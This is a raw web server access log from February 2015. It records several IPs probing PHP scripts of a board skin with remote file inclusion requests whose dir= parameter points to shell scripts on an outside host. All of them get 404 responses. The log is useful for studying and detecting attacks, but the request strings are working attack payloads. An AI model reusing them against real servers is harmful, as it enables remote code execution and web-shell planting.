71.6.150.241 - - [23/Feb/2015:12:19:32 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:34 -0800] "GET ////bbs/skin/ggambo7002_gallery/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:34 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
71.6.150.241 - - [23/Feb/2015:12:19:35 -0800] "POST ////bbs/skin/ggambo7002_gallery/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
178.33.226.103 - - [23/Feb/2015:12:33:28 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:12:33:29 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:12:33:30 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:12:33:31 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [23/Feb/2015:12:33:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:12:33:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:12:33:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [23/Feb/2015:12:33:39 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
211.47.181.38 - - [23/Feb/2015:12:33:50 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:12:33:52 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:12:33:52 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [23/Feb/2015:12:33:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
178.33.226.103 - - [23/Feb/2015:12:34:53 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:12:34:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [23/Feb/2015:12:34:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
